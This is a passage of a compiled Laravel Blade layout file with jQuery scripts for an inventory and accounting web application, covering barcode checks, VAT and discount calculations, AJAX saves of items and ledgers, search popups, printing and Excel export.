              if(isNaN(_qty)){ _qty=0 }
               $(this).closest('tr').find('._qty').val(_qty);
                //Check valid Barcode
               var _old_barcodes = $(this).closest('tr').find('._old_barcode').val();
               var _old_barcodes_array = _old_barcodes.split(",");
               var new_barcode_array=[];
               $(this).closest('tr').find('.amsify-select-tag').each(function(){
                      let single_barcode = $(this).attr("data-val");
                      let check_barcode =  _old_barcodes_array.includes(single_barcode);
                      if(check_barcode===false){
                        alert(" This Barcode Is not Valid !!!");
                        $(this).remove();
                      }else{
                        if (!new_barcode_array.includes(single_barcode)){
                            new_barcode_array.push(single_barcode);
                        }
                            
                        
                      }
                    
               });
              var _string_barcode = new_barcode_array.toString();
               var _qty = new_barcode_array.length
               $(this).text(_qty);
               $(this).closest('tr').find('._qty').val(_qty);
               $(this).closest('tr').find('._barcode').val(_string_barcode);
               //End of Check Valid Barcode
              
               var _sales_rate = $(this).closest('tr').find('._sales_rate').val();
               var _pur_rate   = $(this).closest('tr').find('._rate').val();
               var _sales_vat = $(this).closest('tr').find('._vat').val();
               var _sales_discount = $(this).closest('tr').find('._discount').val();

               

               if(isNaN(_sales_rate)){ _sales_rate=0 }
               if(isNaN(_pur_rate)){ _pur_rate=0 }
               if(isNaN(_sales_vat)){ _sales_vat=0 }
               _vat_amount = ((_pur_rate*_sales_vat)/100)
               if(isNaN(_sales_discount)){ _sales_discount=0 }
               _discount_amount = ((_pur_rate*_sales_discount)/100);
               var _value = (parseFloat(_qty)*parseFloat(_pur_rate));

              $(this).closest('tr').find("._discount").val(_sales_discount);
              $(this).closest('tr').find("._qty").val(_qty);
              $(this).closest('tr').find("._sales_rate").val(_sales_rate);
              $(this).closest('tr').find("._discount_amount").val(_discount_amount);
              $(this).closest('tr').find("._vat").val(_sales_vat);
              $(this).closest('tr').find("._vat_amount").val(_vat_amount);
              $(this).closest('tr').find("._value").val(_value);

          })
             _purchase_total_calculation();

      }
            if(_form_name =='damage'){
            $(document).find('.show-plus-bg').each(function(index){
               var _qty = parseFloat($(this).text());
              if(isNaN(_qty)){ _qty=0 }
                //Check valid Barcode
               var _old_barcodes = $(this).closest('tr').find('._old_barcode').val();
               var _old_barcodes_array = _old_barcodes.split(",");
               var new_barcode_array=[];
               $(this).closest('tr').find('.amsify-select-tag').each(function(){
                      let single_barcode = $(this).attr("data-val");
                      let check_barcode =  _old_barcodes_array.includes(single_barcode);
                      if(check_barcode===false){
                        alert(" This Barcode Is not Valid !!!");
                        $(this).remove();
                      }else{
                        if (!new_barcode_array.includes(single_barcode)){
                            new_barcode_array.push(single_barcode);
                        }
                            
                        
                      }
                    
               });
              var _string_barcode = new_barcode_array.toString();
               var _qty = new_barcode_array.length
               $(this).text(_qty);
               $(this).closest('tr').find('._qty').val(_qty);
              // $(this).closest('tr').find('._barcode').val(_string_barcode);
               //End of Check Valid Barcode

               var _sales_rate = $(this).closest('tr').find('._sales_rate').val();
               var _pur_rate   = $(this).closest('tr').find('._rate').val();
               var _sales_vat = $(this).closest('tr').find('._vat').val();
               var _sales_discount = $(this).closest('tr').find('._discount').val();

               if(isNaN(_sales_rate)){ _sales_rate=0 }
               if(isNaN(_pur_rate)){ _pur_rate=0 }
               if(isNaN(_sales_vat)){ _sales_vat=0 }
               _vat_amount = ((_sales_rate*_sales_vat)/100)
               if(isNaN(_sales_discount)){ _sales_discount=0 }
               _discount_amount = ((_sales_rate*_sales_discount)/100);
               var _value = (parseFloat(_qty)*parseFloat(_sales_rate));

              $(this).closest('tr').find("._discount").val(_sales_discount);
              $(this).closest('tr').find("._qty").val(_qty);
              $(this).closest('tr').find("._sales_rate").val(_sales_rate);
              $(this).closest('tr').find("._discount_amount").val(_discount_amount);
              $(this).closest('tr').find("._vat").val(_sales_vat);
              $(this).closest('tr').find("._vat_amount").val(_vat_amount);
              $(this).closest('tr').find("._value").val(_value);
          })
             _purchase_total_calculation();

      }


           
     }
}

$(document).on('click',function(){
    _common_click_function();
})

$(document).on('keyup','.amsify-suggestags-input',function(e){
    var code = (e.keyCode ? e.keyCode : e.which);
    if(code == 13) { //Enter keycode
        _common_click_function();
    }
})


$(document).on('click','._pushmenu',function(){

if($(document).find("._pushmenu").hasClass("_left_menu_show")){
  $(document).find('._pushmenu').removeClass('_left_menu_show');
  $(document).find('.main-sidebar').hide();
  $(document).find('._project_main_nav_logo').show();
}else{
  $(document).find('._pushmenu').addClass('_left_menu_show');
  $(document).find('.main-sidebar').show();
  $(document).find('._project_main_nav_logo').hide();

}
  

  
 

})



$(document).on('click','.save_item',function(){
    var _category_id = $(document).find("._category_id").val();
    var _item_item = $(document).find("._item_item").val();
    var _item_code = $(document).find("._item_code").val();
    var _item_unit_id = $(document).find("._item_unit_id").val();
    var _item_barcode = $(document).find("._item_barcode").val();
    var _item_discount = $(document).find("._item_discount").val();
    var _item_vat = $(document).find("._item_vat").val();
    var _item_pur_rate = $(document).find("._item_pur_rate").val();
    var _item_sale_rate = $(document).find("._item_sale_rate").val();
    var _item_manufacture_company = $(document).find("._item_manufacture_company").val();
    var _item_status = $(document).find("._item_status").val();
    var _item_unique_barcode = $(document).find("._item_unique_barcode").val();
    var _kitchen_item = $(document).find("#_kitchen_item").val();
    var _item_opening_qty = $(document).find("#_item_opening_qty").val();
    var _item_branch_id = $(document).find("._item_branch_id").val();
    var _item_cost_center_id = $(document).find("._item_cost_center_id").val();
    var _item_store_id = $(document).find("._item_store_id").val();
    var _item_pack_size_id  = $(document).find("._item_pack_size_id").val();
    var _item_brand_id  = $(document).find("._item_brand_id").val();
    var _item_brand_id  = $(document).find("._item_brand_id").val();
    var _itemhs_code  = $(document).find("._itemhs_code").val();
    var _itemhs_code_2  = $(document).find("._itemhs_code_2").val();
    var _item_category  = $(document).find("._item_category").val();
    var _item_curum  = $(document).find("._item_curum").val();
    var _item_length  = $(document).find("._item_length").val();







    
    var reqired_fields = 0;
    if(_category_id ==""){
       $(document).find('._category_id').addClass('required_border');
       reqired_fields =1;
    }else{
      $(document).find('._category_id').removeClass('required_border');
    }

    if(_item_pack_size_id  ==""){
       $(document).find('._item_pack_size_id').addClass('required_border');
       reqired_fields =1;
    }else{
      $(document).find('._item_pack_size_id').removeClass('required_border');
    }


    if(_item_item ==""){
       $(document).find('._item_item').addClass('required_border');
       reqired_fields =1;
    }else{
      $(document).find('._item_item').removeClass('required_border');
    }
    if(_item_unit_id ==""){
       $(document).find('._item_unit_id').addClass('required_border');
       reqired_fields =1;
    }else{
      $(document).find('._item_unit_id').removeClass('required_border');
    }
    
    if(reqired_fields ==1){
      return false;
    }

    $.ajaxSetup({ headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')} });

        $.ajax({
           type:'POST',
           url:"<?php echo e(url('ajax-item-save')); ?>",
           data:{_category_id,_item_item,_item_code,_item_unit_id,_item_barcode,_item_discount,_item_vat,_item_pur_rate,_item_sale_rate,_item_manufacture_company,_item_status,_item_unique_barcode,_kitchen_item,_item_store_id,_item_branch_id,_item_cost_center_id,_item_opening_qty,_item_pack_size_id,_item_brand_id,_itemhs_code,_itemhs_code_2,_item_category,_item_curum,_item_length
           },



           success:function(data){
            console.log(data)
              if(data !=""){
                if(data==0){
                    alert("This Name has been already Taken");
                }else{
                   alert("Information Save Successfully");
                    $(document).find("._item_modal_form").trigger('reset');
                    $(document).find(".inventoryEntryModal").click();
                }
               
                
              }else{
                alert("Information Not Save");
              }

           }

        });

  })

  $(document).on('click','.save_ledger',function(){
    var _account_head_id = $(document).find("._account_head_id").val();
    var _account_groups = $(document).find("._account_groups").val();
    var _ledger_organization_id = $(document).find("._ledger_organization_id").val();
    var _ledger_cost_center_id = $(document).find("._ledger_cost_center_id").val();
    var _ledger_branch_id = $(document).find("._ledger_branch_id").val();



    var _ledger_name = $(document).find("._ledger_name").val();
    var _ledger_address = $(document).find("._ledger_address").val();
    var _ledger_code = $(document).find("._ledger_code").val();
    var _ledger_short = $(document).find("._ledger_short").val();
    var _ledger_nid = $(document).find("._ledger_nid").val();
    var _ledger_phone = $(document).find("._ledger_phone").val();
    var _ledger_email = $(document).find("._ledger_email").val();
    var _ledger_credit_limit = $(document).find("._ledger_credit_limit").val();
    var _ledger_is_user = $(document).find("._ledger_is_user").val();
    var _ledger_is_sales_form = $(document).find("._ledger_is_sales_form").val();
    var _ledger_is_purchase_form = $(document).find("._ledger_is_purchase_form").val();
    var _ledger_is_all_branch = $(document).find("._ledger_is_all_branch").val();
    var _ledger_status = $(document).find("._ledger_status").val();
    var opening_cr_amount = $(document).find(".opening_cr_amount").val();
    var opening_dr_amount = $(document).find(".opening_dr_amount").val();

    var reqired_fields = 0;
    if(_account_head_id ==""){
       $(document).find('._account_head_id').addClass('required_border');
       reqired_fields =1;
    }else{
      $(document).find('._account_head_id').removeClass('required_border');
    }
    if(_account_groups ==""){
       $(document).find('._account_groups').addClass('required_border');
       reqired_fields =1;
    }else{
      $(document).find('._account_groups').removeClass('required_border');
    }
    if(_ledger_name ==""){
       $(document).find('._ledger_name').addClass('required_border');
       reqired_fields =1;
    }else{
      $(document).find('._ledger_name').removeClass('required_border');
    }
    if(reqired_fields ==1){
      return false;
    }

    $.ajaxSetup({
        headers: {
            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
        }
    });

        $.ajax({
           type:'POST',
           url:"<?php echo e(url('ajax-ledger-save')); ?>",
           data:{_account_head_id,_account_groups,_ledger_branch_id,_ledger_name,_ledger_address,_ledger_code,_ledger_short,_ledger_nid,_ledger_phone,_ledger_email,_ledger_credit_limit,_ledger_is_user,_ledger_is_sales_form,_ledger_is_purchase_form,_ledger_is_all_branch,_ledger_status,opening_cr_amount,opening_dr_amount,_ledger_organization_id,_ledger_cost_center_id
           },
           success:function(data){
             console.log(data)
              if(data !=""){
                if(data==0){
                    alert("This Name has been already Taken");
                }else{
                  alert("Information Save Successfully");
                  $(document).find("._ledger_modal_form").trigger('reset');
                  $(document).find(".ledgerEntryModal").click();
                }
                
                
              }else{
                alert("Information Not Save");
              }

           }

        });

  })

$(document).on('click','.inventoryEntryModal',function(){
    $(document).find("#exampleModalLong_item").modal("hide");
})

$(document).on('click','.ledgerEntryModal',function(){
    $(document).find("#exampleModalLong").modal("hide");
})
$(document).on('click','.duplicateBarcodeModalclose',function(){
    $(document).find("#duplicateBarcodeModal").modal("hide");
})
$(document).on('click','.exampleModalClose',function(){
    $(document).find("#exampleModal").modal("hide");
})


function after_request_date__today(_date){
            var data = _date.split('-');
            var yyyy =data[0];
            var mm =data[1];
            var dd =data[2];
            if(default_date_formate=='DD-MM-YYYY'){
              return (dd[1]?dd:"0"+dd[0]) +"-"+ (mm[1]?mm:"0"+mm[0])+"-"+ yyyy ;
            }
            if(default_date_formate=='MM-DD-YYYY'){
              return (mm[1]?mm:"0"+mm[0])+"-" + (dd[1]?dd:"0"+dd[0]) +"-"+  yyyy ;
            }
            

            
          }


function item_wise_unitConversionDetail(_item_id,_item_row_count){
  console.log("_item_id "+_item_id)

    var request = $.ajax({
      url: "<?php echo e(url('item-wise-units')); ?>",
      async:false,
      method: "GET",
      data: { item_id:_item_id },
       dataType: "html"
    });
     
    request.done(function( response ) {
      $("."+_item_row_count+"_transection_unit").html("")
      $("."+_item_row_count+"_transection_unit").html(response);
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });
}

   $(document).on("click","._action_button_detail",function(){
      var _id = $(this).attr('attr_id');
       var _show_detils= $(document).find('._action_button__'+_id).hasClass('_show_detils');
       var _type=$(this).attr('attr_type');
      if(_show_detils ==false){
        $(document).find('._action_button__'+_id).addClass('_show_detils');
            $.ajaxSetup({  headers: {  'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')  } });

            $.ajax({
               type:'POST',
               url:"<?php echo e(url('master-base-detils')); ?>",
               data:{_id, _type},
               dataType:'HTML',
               success:function(data){
                  $(document).find("._details_show__"+_id).html(data);

               }

            });
      }
    })

</script>

<script type="text/javascript">

 function printDiv(divID) {
            var divElements = document.getElementById(divID).innerHTML;
            var oldPage = document.body.innerHTML;
            document.body.innerHTML ="<html><head><title></title></head><body>" +
                divElements + "</body>";
            window.print();
           
            document.body.innerHTML = oldPage;
            // window.close();
           // // location.reload();

  
        }

function printDivLandscape(divID) {
    var divElements = document.getElementById(divID).innerHTML;
    var oldPage = document.body.innerHTML;
    
    // Add landscape orientation styles
    var printStyle = '<style>@page  { size: landscape; }</style>';
    
    // Create a new print layout with the landscape style
    document.body.innerHTML = "<html><head><title></title>" + printStyle + "</head><body>" +
        divElements + "</body></html>";
    
    // Trigger the print dialog
    window.print();
    
    // Restore the original content of the page
    document.body.innerHTML = oldPage;
}
        
 function modalPrint(divID) {
            var content = document.getElementById(divID).innerHTML;
          var printWindow = window.open('', '_blank');
          printWindow.document.open();
          printWindow.document.write('<html><head><title>Print</title></head><body>' + content + '</body></html>');
          printWindow.document.close();
          printWindow.print();
          printWindow.close();
}


  function fnExcelReport() {
      
        var tab_text = document.getElementById("printablediv").outerHTML;

    // Convert HTML table to workbook
    var wb = XLSX.utils.table_to_book(document.getElementById('printablediv'), { sheet: "Sheet1" });

    // Modify cell styles to add borders
    var ws = wb.Sheets['Sheet1'];
    var range = XLSX.utils.decode_range(ws['!ref']);
    for (var R = range.s.r; R <= range.e.r; ++R) {
        for (var C = range.s.c; C <= range.e.c; ++C) {
            var cellAddress = XLSX.utils.encode_cell({ r: R, c: C });
            if (!ws[cellAddress]) continue;
            ws[cellAddress].s = { border: { top: { style: "thin", color: { auto: 1 } }, bottom: { style: "thin", color: { auto: 1 } }, left: { style: "thin", color: { auto: 1 } }, right: { style: "thin", color: { auto: 1 } } } };
        }
    }

    // Generate Excel file and trigger download
    return XLSX.writeFile(wb, 'export.xlsx');
    } 


    function _lock_action(_id,_action,_table_name){
       $.ajaxSetup({headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')} });
        $.ajax({
           type:'POST',
           url:"<?php echo e(url('_lock_action')); ?>",
           data:{_id,_action,_table_name},
           success:function(data){
              console.log(data);
           }
        });
    }  


    function isEmpty(value){
  if ( value === 'undefined' || value =="" || value =="null" || value ==null || value ==undefined) {
        return  value = "";
    }else{
      return value;
    }
}
 


    
    $(document).on('click',"input[type='number']",function(){
        $(this).select();
    })
    // $(document).on('click',"input[type='text']",function(){
    //     $(this).select();
    // })

    $(document).on('change',"#_unique_barcode",function(){
      var _check_val = $(this).val();
      if(_check_val ==1){
        $(document).find("#_barcode").val("");
        $(document).find("#_barcode").attr("readonly",true);
      }else{
        $(document).find("#_barcode").attr("readonly",false);
      }

    })
   
$(function(){
 // $(document).find("._pushmenu").click();
  //$(document).find(".display_none").hide();
})




//Role and permission section

$(document).on('change','[name="group_check"]',function(){
    var class_name = $(this).attr('class');
    if ($(this).is(':checked')) {
      $(document).find(`.${class_name}`).attr('checked',true);
    }else{
      $(document).find(`.${class_name}`).attr('checked',false);
    }
})

$(document).on('change','[name="all_all_check"]',function(){
    var class_name = 'all_check';
    if ($(this).is(':checked')) {
      $(document).find(`.${class_name}`).attr('checked',true);
    }else{
      $(document).find(`.${class_name}`).attr('checked',false);
    }
})


 function check_select_org_branch_cost_center(){
    var _master_organization_id = $(document).find("._master_organization_id").val();
    var _master_branch_id = $(document).find("._master_branch_id").val();
    var _cost_center_id = $(document).find("._cost_center_id").val();
    if(_master_organization_id ==""){
      alert('Please Select Organization/Company');
        return false;
      }
      if(_master_branch_id ==""){
        alert('Please Select Branch/Division');
        return false;
      }

      if(_cost_center_id ==""){
        alert('Please Select Cost Center/Project');
        return false;
      }
  }





  $(document).on("change","._master_organization_id",function(){
    change_all_budget_organization();
  })
  function change_all_budget_organization(){
    var _master_organization_id = $(document).find("._master_organization_id").val();
    $(document).find(".organization_details_id").val(_master_organization_id).change();
  }


   $(document).on("change","._master_branch_id",function(){

    change_all_branch_selection();

    var _form_name = $(document).find("._form_name").val();
    console.log(_form_name)
    if(_form_name =='sales' || _form_name=='sales_man_wise_sales_detail' || _form_name=='sales_orders' || _form_name=='date_to_date_sales_amount_report' || _form_name=='supplier_payments'  || _form_name=='receive_payments'  || _form_name=='branch_wise_sales_statement'  || _form_name=='transection_terms_wise_sales_report' ){
      branch_wise_sales_person();
    }


  })


   /*
      Branch Wise Sales Peroson Ajax
   */

   function branch_wise_sales_person(){

    var _branch_id = $(document).find("._master_branch_id").val();

    $("#spinner_div").show();

    var request = $.ajax({
      url: "<?php echo e(url('branch_wise_sales_person')); ?>",
      method: "GET",
      data: { _branch_id },
      
    });
     
    request.done(function( result ) {
      $(document).find("._sales_man").html(result);
      $("#spinner_div").hide();

    })

   }


   function division_wise_district(data,display_class,url){
     $("#spinner_div").show();
 var request = $.ajax({
      url: url,
      method: "GET",
      data: data,
      
    });
     
    request.done(function( result ) {

      $(document).find(display_class).html(result);
       $("#spinner_div").hide();
    })
}





  function change_all_branch_selection(){
    var _master_branch_id = $(document).find('._master_branch_id').val();
    $(document).find("._branch_id_detail").val(_master_branch_id).change();
  }


  $(document).on("change","._master_cost_center_id",function(){
    change_all_cost_center_selection();
  })
  function change_all_cost_center_selection(){
    var _master_cost_center_id = $(document).find("._master_cost_center_id").val();
    $(document).find("._cost_center").val(_master_cost_center_id).change();
  }


 


  $(document).on("change","._master_budget_id",function(){
    change_all_budget_selection();
  })
  function change_all_budget_selection(){
    var _master_budget_id = $(document).find('._master_budget_id').val();
    $(document).find("._budget_details_id").val(_master_budget_id).change();
  }

$(document).on('keyup','.user_id_name',delay(function(e){
    
    var action_url = project_base_url+"/"+'employee-search';
  var _gloabal_this = $(this);
  var _text_val = $(this).val().trim();
  var request = $.ajax({
      url: action_url,
      method: "GET",
      data: { _text_val : _text_val },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table style="width: 300px;">
            <thead>
            <tr>
              <td>Code</td>
              <td>Name</td>
              <td>Organization</td>
              <td>Cost Center</td>
              <td>Branch</td>
              <td>Designation</td>
              <td>Location</td>
            </tr>
            </thead> 
            <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="_employee_search_row _cursor_pointer" >
                                        <td>${data[i]._code}
                                        <input type="hidden" name="_emplyee_row_id" class="_emplyee_row_id" value="${data[i]?.id}">
                                        <input type="hidden" name="_emplyee_row_code_id" class="_emplyee_row_code_id" value="${data[i]?._code}">
                                        </td>
                                        <td>${data[i]._name}
                                        <input type="hidden" name="_search_employee_name" class="_search_employee_name" value="${data[i]._name}">
                                        <input type="hidden" name="_search_employee_ledger_id" class="_search_employee_ledger_id" value="${data[i]?._ledger_id}">
                                        
                                        </td>
                                        <td>${data[i]?._organization?._name}</td>
                                        <td>${data[i]?._branch?._name}</td>
                                        <td>${data[i]?._cost_center?._name}</td>
                                        <td>${data[i]?._emp_designation?._name}</td>
                                        <td>${data[i]?._emp_location?._name}</td>
                                        
                                       
                                        </tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }else{
        search_html +=`<div class="card"><table style="width: 300px;"> 
        <thead><th colspan="3">No Data Found</th></thead><tbody></tbody></table></div>`;
      }   

       _gloabal_this.parent('td').find('.search_box_employee').html(search_html);
      _gloabal_this.parent('td').find('.search_box_employee').addClass('search_box_show').show();  
      
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });
}, 500));


$(document).on('click','._employee_search_row',function(){
 var employee_row_id = $(this).children('td').find('._emplyee_row_id').val();
 var employee_code_id = $(this).children('td').find('._emplyee_row_code_id').val();
 var employee_name = $(this).children('td').find('._search_employee_name').val();
 console.log(employee_name)
 var _code_and_name = `${employee_code_id},${employee_name}`;

$(this).parent().parent().parent().parent().parent().parent().find('.user_id_name').val(_code_and_name);
$(this).parent().parent().parent().parent().parent().parent().find('.user_row_id').val(employee_row_id);
$(this).parent().parent().parent().parent().parent().parent().find('.user_id').val(employee_code_id);


  $(document).find('.search_box_employee').hide();
  $(document).find('.search_box_employee').removeClass('search_box_show').hide();
})



$(document).on('keyup','.sales_target_ledger_id',delay(function(e){
    
    var action_url = project_base_url+"/"+'ledger-search';
  var _gloabal_this = $(this);
  var _text_val = $(this).val().trim();
  var request = $.ajax({
      url: action_url,
      method: "GET",
      data: { _text_val : _text_val },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table style="width: 300px;">
            <thead>
            <tr>
              <td>Branch</td>
              <td>Code</td>
              <td>Name</td>
              <td>Phone</td>
            </tr>
            </thead> 
            <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="_sales_target_ledger_row _cursor_pointer" >
                                        <td>${data[i]?._entry_branch?._name}</td>
                                        <td>${data[i]._code}
                                        <input type="hidden" name="_search_ledger_code" class="_search_ledger_code" value="${data[i]?._code}">
                                        <input type="hidden" name="_search_ledger_id" class="_search_ledger_id" value="${data[i]?.id}">
                                        <input type="hidden" name="_search_ledger_name" class="_search_ledger_name" value="${data[i]?._name}">
                                        <input type="hidden" name="_search_ledger_branch_name" class="_search_ledger_branch_name" value="${data[i]?._entry_branch?._name}">
                                        <input type="hidden" name="_search_ledger_branch_id" class="_search_ledger_branch_id" value="${data[i]?._entry_branch?.id}">
                                        </td>
                                        <td>${data[i]?._name}</td>
                                        <td>${data[i]?._phone}</td>
                                         <td>${data[i]?._alious}</td>
                                        <td>${data[i]?._entry_branch?._name}</td>
                                        <td>${data[i]?._address}</td>
                                        
                                        
                                       
                                        </tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }else{
        search_html +=`<div class="card"><table style="width: 300px;"> 
        <thead><th colspan="3">No Data Found</th></thead><tbody></tbody></table></div>`;
      }   

       _gloabal_this.parent('td').find('.search_box_employee').html(search_html);
      _gloabal_this.parent('td').find('.search_box_employee').addClass('search_box_show').show();  
      
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });
}, 500));


$(document).on('click','._sales_target_ledger_row',function(){
 var _search_ledger_code = $(this).children('td').find('._search_ledger_code').val();
 var _search_ledger_id = $(this).children('td').find('._search_ledger_id').val();
 var _search_ledger_name = $(this).children('td').find('._search_ledger_name').val();
 var _search_ledger_branch_name = $(this).children('td').find('._search_ledger_branch_name').val();
 var _search_ledger_branch_id = $(this).children('td').find('._search_ledger_branch_id').val();
 
 




$(this).parent().parent().parent().parent().parent().parent().find('.sales_target_ledger_id').val(_search_ledger_name);
$(this).parent().parent().parent().parent().parent().parent().find('._ledger_id').val(_search_ledger_id);
$(this).parent().parent().parent().parent().parent().parent().find('._branch_id').val(_search_ledger_branch_id);
$(this).parent().parent().parent().parent().parent().parent().find('._branch_id_name').val(_search_ledger_branch_name);


  $(document).find('.search_box_employee').hide();
  $(document).find('.search_box_employee').removeClass('search_box_show').hide();
})

</script>
 <script type="text/javascript">
$(function() {
    var start = moment().subtract(29, 'days');
    var end = moment();

    function cb(start, end) {
        $('#reportrange span').html(start.format('MMMM D, YYYY') + ' - ' + end.format('MMMM D, YYYY'));

        // Set hidden input values
        $('#_datex').val(start.format('YYYY-MM-DD')); // Start date
        $('#_datey').val(end.format('YYYY-MM-DD'));   // End date
    }

    $('#reportrange').daterangepicker({
        startDate: start,
        endDate: end,
        ranges: {
           'Today': [moment(), moment()],
           'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
           'Last 7 Days': [moment().subtract(6, 'days'), moment()],
           'Last 30 Days': [moment().subtract(29, 'days'), moment()],
           'This Month': [moment().startOf('month'), moment().endOf('month')],
           'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
        }
    }, cb);

    cb(start, end);
});
</script>


<?php echo $__env->yieldContent('script'); ?>
</body>
</html>
<?php /**PATH D:\xampp\htdocs\avansis-software\resources\views/backend/layouts/app.blade.php ENDPATH**/ ?>